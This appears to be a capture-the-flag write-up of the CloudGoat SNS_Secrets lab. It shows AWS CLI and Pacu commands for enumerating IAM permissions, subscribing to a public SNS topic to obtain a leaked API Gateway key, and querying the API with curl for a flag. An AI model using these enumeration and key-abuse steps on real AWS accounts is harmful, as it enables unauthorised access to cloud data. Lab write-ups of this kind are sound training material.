---
title: "Cloudgoat SNS_Secrets Walkthrou"
date: 2025-08-21
categories: ["Cloud", "AWS"]
tags: ["AWC CLI", "Pacu", "SNS"]
description: "This is a wlakthrou of one of te easy environments provided by cloadgoat project"
---

# Initial Access / Credentials

```bash
sns_user_access_key_id = AKIA[REDACTED-CTF]
sns_user_secret_access_key = [REDACTED-CTF]
```

## AWC CLI profile creation

```bash
aws configure --profile sns
AWS Access Key ID [None]: AKIA[REDACTED-CTF]
AWS Secret Access Key [None]: [REDACTED-CTF]
Default region name [None]: us-east-1
Default output format [None]: json
```

>-Created an aws profile with the credentials given

## IAM Enumeration with `sns` credentials

**whoami**

```bash
└─$ aws sts get-caller-identity --profile sns                
{
    "UserId": "AIDAUGVOUJQILY3KHBHBA",
    "Account": "289202785296",
    "Arn": "arn:aws:iam::289202785296:user/cg-sns-user-cgid6j1kvw51kk"
}

```

> Got username **cg-sns-user-cgid6j1kvw51kk**

**List Users Roles Policies and Groups**

```bash
aws iam list-users --profile sns                                                 
aws iam list-roles --profile sns
aws iam list-policies --profile sns

aws iam list-groups-for-user --user-name cg-sns-user-cgid6j1kvw51kk --profile sns
{
    "Groups": []
}

```

> We dont have permission to list users, roles, policies but we did for groups which it seems nothing is there

**Lists managed and inline policies for our user**

**List managed user policies**
```bash
aws iam list-attached-user-policies --user-name cg-sns-user-cgid6j1kvw51kk --profile sns
{
    "AttachedPolicies": []
}
```

**List inline user policies**
```bash
aws iam list-user-policies --user-name cg-sns-user-cgid6j1kvw51kk --profile sns

{
    "PolicyNames": [
        "cg-sns-user-policy-cgid6j1kvw51kk"
    ]
}
```

> It seems that we finally found something. Our user has a custom policy attatched to it.

**Get user inline policy details**

```bash
aws iam get-user-policy --user-name cg-sns-user-cgid6j1kvw51kk --policy-name cg-sns-user-policy-cgid6j1kvw51kk --profile sns

{
    "UserName": "cg-sns-user-cgid6j1kvw51kk",
    "PolicyName": "cg-sns-user-policy-cgid6j1kvw51kk",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "sns:Subscribe",
                    "sns:Receive",
                    "sns:ListSubscriptionsByTopic",
                    "sns:ListTopics",
                    "sns:GetTopicAttributes",
                    "iam:ListGroupsForUser",
                    "iam:ListUserPolicies",
                    "iam:GetUserPolicy",
                    "iam:ListAttachedUserPolicies",
                    "apigateway:GET"
                ],
                "Effect": "Allow",
                "Resource": "*"
            },
            {
                "Action": "apigateway:GET",
                "Effect": "Deny",
                "Resource": [
                    "arn:aws:apigateway:us-east-1::/apikeys",
                    "arn:aws:apigateway:us-east-1::/apikeys/*",
                    "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/GET",
                    "arn:aws:apigateway:us-east-1::/restapis/*/methods/GET",
                    "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/integration",
                    "arn:aws:apigateway:us-east-1::/restapis/*/integration",
                    "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/*/integration"
                ]
            }
        ]
    }
}
```

> Most of the **iam** permissions we already enumerated but it seems we can enumerate more on **sns** and **apigateway**

But first...
**What is SNS in AWS?**
```bash
Amazon Simple Notification Service (Amazon SNS) is a web service that **makes it easy to set up, operate, and send notifications from the cloud**.
```

## SNS Enumeration

**Listing SNS Topics**
```bash
aws sns list-topics --profile sns

{
    "Topics": [
        {
            "TopicArn": "arn:aws:sns:us-east-1:289202785296:public-topic-cgid6j1kvw51kk"
        }
    ]
}
```

> We got the arn of 1 topic.But lets continue our enumeration and extract all the information we can with the permissions that we have

**Get SNS Topic Attributes**

```bash
aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:289202785296:public-topic-cgid6j1kvw51kk --region us-east-1 --profile sns
aws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:us-east-1:289202785296:public-topic-cgid6j1kvw51kk --profile sns
```

**Subscirbe to a SNS Topic**

For this one i used pacu. 
Also to successfully subscribe to an SNS topic we need the **Topic ARN** as well as a **working email**!

```bash
run sns__subscribe --topics arn:aws:sns:us-east-1:289202785296:public-topic-cgid6j1kvw51kk --email dotpirate@dotpirate.rocks
```

> After subscribing I recreived an email to which I had to click the link to activate the subscription and right after that I recieved a second email with an API GATEWAY KEY! 45a3da61***********

So what can i do with this key.. Since I am new into this i start googling around about how could I escalate my privileges using the API GATEWAY.
Additionally, i checked the description of the lab and it says tha we have to query the endpoint to get the flag!
I found that in order to query the endpoint we need the **api-id**, **region**, **stage** and the **path**
So lets get those...

**Enumerating REST APIs**

```bash
{
    "items": [
        {
            "id": "5btvmrrlfi",
            "name": "cg-api-cgid6j1kvw51kk",
            "description": "API for demonstrating leaked API key scenario",
            "createdDate": "2025-08-21T07:34:51-05:00",
            "apiKeySource": "HEADER",
            "endpointConfiguration": {
                "types": [
                    "EDGE"
                ],
                "ipAddressType": "ipv4"
            },
            "tags": {
                "Scenario": "iam_privesc_by_key_rotation",
                "Stack": "CloudGoat"
            },
            "disableExecuteApiEndpoint": false,
            "rootResourceId": "7fezg1k4h5"
        }
    ]
```

> Got the REST api id

**Enumerating All Accessible API Endpoints**

```bash
aws apigateway get-resources  --rest-api-id 5btvmrrlfi --profile sns

{
    "items": [
        {
            "id": "7fezg1k4h5",
            "path": "/"
        },
        {
            "id": "ernlg7",
            "parentId": "7fezg1k4h5",
            "pathPart": "user-data",
            "path": "/user-data",
            "resourceMethods": {
                "GET": {}
            }
        }
    ]
}
```

> Now we got the path

**Finding the stage name**

```bash
aws apigateway get-resources  --rest-api-id 5btvmrrlfi --profile sns

{
    "items": [
        {
            "id": "7fezg1k4h5",
            "path": "/"
        },
        {
            "id": "ernlg7",
            "parentId": "7fezg1k4h5",
            "pathPart": "user-data",
            "path": "/user-data",
            "resourceMethods": {
                "GET": {}
            }
        }
    ]
}
```

> We got everyhing and we can build the URL!

**Putting all together to form the HTTP request**
```bash
curl -v -H "x-api-key: <your-api-key>" https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/flag

curl -H "x-api-key: 45a3d************" 'https://5btvmrrlfi.execute-api.us-east-1.amazonaws.com/prod-cgid6j1kvw51kk/user-data'


{"final_flag":"FLAG{SNS_S3cr3ts_ar3_FUN}","message":"Access granted","user_data":{"email":"SuperAdmin@notarealemail.com","password":"p@ssw0rd123","user_id":"1337","username":"SuperAdmin"}}
```
